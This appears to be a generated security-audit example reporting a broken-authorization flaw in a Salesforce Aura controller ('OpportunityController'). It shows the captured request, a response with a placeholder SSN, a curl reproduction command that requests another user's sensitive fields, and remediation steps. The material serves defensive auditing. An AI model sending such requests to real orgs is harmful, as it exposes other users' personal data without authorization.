# Security Analysis Report
**System:** VaultGuard IAM API (Salesforce-Integrated)
**Domain:** Cloud IAM
**Example ID:** SF-0044
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.12 | Mass assignment via object fields on `OpportunityController.getOpportunity` — attacker reads and escalates IAM Opportunity records |

---

## Finding 1 — BOLA: Mass Assignment via Object Fields on Opportunity (Pattern 1.12)

### Summary
The Apex controller `OpportunityController` on VaultGuard IAM API (`2c2cbec7.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Opportunity object. Per §5.0 Pattern 1.12, the client-supplied `fields` parameter in the Aura payload enables mass assignment — the attacker requests all sensitive fields including `SensitiveData__c` and `InternalNotes__c` for a victim's Opportunity record. No ownership predicate exists. In a cloud IAM context, Opportunity records may represent access provisioning workflows, identity federation agreements, and IAM operator PII.

**Pattern:** 1.12 — Mass assignment via object fields (BOLA)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://2c2cbec7.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://2c2cbec7.lightning.force.com/aura
Authorization: Bearer 00D2C2CBEC7!AR2c2cbec7...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D2C2CBEC7!AR2c2cbec7...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN",
"params":{"opportunityId":"001BEC7","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim IAM Opportunity Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001BEC7", "Name": "Victim Opportunity Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-25-3062"
  }] }, "error": [] }]
}
```

### Evidence Map

| Artifact | Value | Significance |
|---|---|---|
| §4.0 `without sharing` | Class declaration | OWD=Private bypassed |
| §5.0 Pattern 1.12 | Mass assignment via fields | Client-controlled field list |
| §7.0 OWD Opportunity: Private | Sharing config | Only owner should access |
| §8.0 RISK-SF-044 | No `with sharing` | Sharing rules not enforced |
| §8.0 RISK-SF-045 | No ownership predicate | Any `opportunityId` accepted |
| HAR `opportunityId` | `001BEC7` | Victim IAM Opportunity |
| HAR `fields` | Full sensitive list | Client harvests all sensitive fields |
| HAR `SensitiveData__c` | `SSN: 000-25-3062` | IAM operator PII |

### Steps to Reproduce

```bash
SESSION="00D2C2CBEC7!AR2c2cbec7..."
curl -s -X POST "https://2c2cbec7.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"001BEC7","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Expected (vulnerable): state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-25-3062
# Expected (secure): state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class OpportunityController { ... }`
2. `WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client-controlled `fields` parameter; use server-side allowlist.
4. Validate `aura.token`.
